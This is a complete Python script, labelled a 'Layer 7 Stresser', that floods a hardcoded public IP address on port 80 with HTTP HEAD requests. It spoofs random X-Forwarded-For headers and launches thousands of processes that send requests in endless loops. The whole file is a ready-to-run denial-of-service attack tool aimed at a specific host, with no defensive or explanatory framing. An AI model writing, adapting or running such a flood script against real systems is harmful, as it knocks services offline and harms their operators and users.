import socket
import os, sys
import time
import multiprocessing, random

ip = "88.198.18.78"
port = int("80")

url = "http://" + str(ip)

def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)

print("[!] Hitting Server - Close Terminal to Stop!")


time.sleep(1) # Time to wait for the attack to launch after running the script


def attack(): # The root of the attack
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      # Attack processing starts here
      for y in range(100):
          atk.send(str.encode(request))
    except socket.error:
      time.sleep(.1)
    except:
      pass

# Multiprocessing to make the stresser run on more processes
def sendattack():
  for i in range(5000): # Number of Processes
    mp = multiprocessing.Process(target=attack)
    mp2 = multiprocessing.Process(target=attack)
    mp3 = multiprocessing.Process(target=attack)
    mp4 = multiprocessing.Process(target=attack)
    mp5 = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp2.setDaemon = False
    mp3.setDaemon = False
    mp4.setDaemon = False
    mp5.setDaemon = False
    mp.start()
    mp2.start()
    mp3.start()
    mp4.start()
    mp5.start()

sendattack() # send attack
# End of Powerful Layer 7 Stresser.
